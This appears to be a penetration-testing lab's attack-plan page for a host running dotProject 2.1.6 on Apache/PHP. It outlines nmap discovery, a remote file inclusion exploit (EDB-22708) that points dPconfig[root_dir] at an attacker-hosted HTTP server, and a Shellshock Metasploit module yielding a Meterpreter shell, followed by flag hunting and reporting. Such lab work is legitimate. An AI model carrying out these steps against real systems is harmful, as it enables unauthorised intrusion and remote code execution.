# Attack plan — `10.20.160.102` (Linux / dotProject 2.1.6)

**Host:** **`10.20.160.102`** · **Stack:** **Apache 2.2.21**, **PHP 5.3.8**, **LAMPP**, app at **`/dotproject/`**.

**Navigation:** [Host README (full runbook)](../README.md) · [Screenshots](../Screenshots/) · [Credential pivot](../credential_pivot.md) · [Unfruitful log](../unfruitful_attempts/README.md) · [Work index](../../README.md)

---

## Phase 0 — Preconditions

- Set **`RHOST_102`** and **`LHOST`** / **`KALI_LAB_IP`** to an interface **`.102` can reach** (`ip -br a`).
- Keep **RFI PoC** **`python3 -m http.server 8080`** on **`0.0.0.0`** in the **same directory** as served files.

## Phase 1 — Discovery

- **`nmap`** (full + **80/443/8080/8443** with **`http-enum`**, **`http-headers`**).
- **`curl`** **`/`**, **`/dotproject/`**, **`index.php`** for version and redirects.
- Optional **`nikto`**, **OWASP ZAP** (spider + active) — capture **Medium** items (e.g. **`login`** parameter tampering).

## Phase 2 — Validated access (pick order by time-box)

- **RFI:** **`searchsploit dotproject 2.1.6`** → **EDB-22708**; **`gantt.php`** + **`dPconfig[root_dir]=http://<KALI>:8080/...`** → body reflects **`PROOF`** (**`102-004`** in [`../Screenshots/`](../Screenshots/)).
- **Shellshock (Meterpreter):** **`exploit/multi/http/apache_mod_cgi_bash_env_exec`** — a **`check`** on **`/cgi-bin/printenv`** may still say **not vulnerable**; **`run`** can succeed when **`TARGETURI`** hits a **real `mod_cgi`** script. Capture **`LHOST`** / handler port and post-ex (**`sysinfo`**, **`getuid`**, **`shell`**) — evidence **`102-009`**.

## Phase 3 — Generic catalogue (time-box)

- **`searchsploit`** Apache/PHP rows — background only; see [unfruitful log](../unfruitful_attempts/README.md).

## Phase 4 — Next bets

- **`login`** / **`index.php`**: time-box **SQLi**, **auth bypass**, or **`sqlmap`** if ROE allows.
- **Flags:** **`find`** for **`local.txt` / `proof.txt`** only after a **read** or **shell** primitive exists.

## Phase 5 — Reporting

- Chain **EDB-22708** → **`102-004`**, ZAP **`102-005`**, and **Shellshock Meterpreter** **`102-009`** for the narrative; archive dead ends under [unfruitful log](../unfruitful_attempts/README.md).

---

**Full command blocks and evidence index:** [../README.md](../README.md).
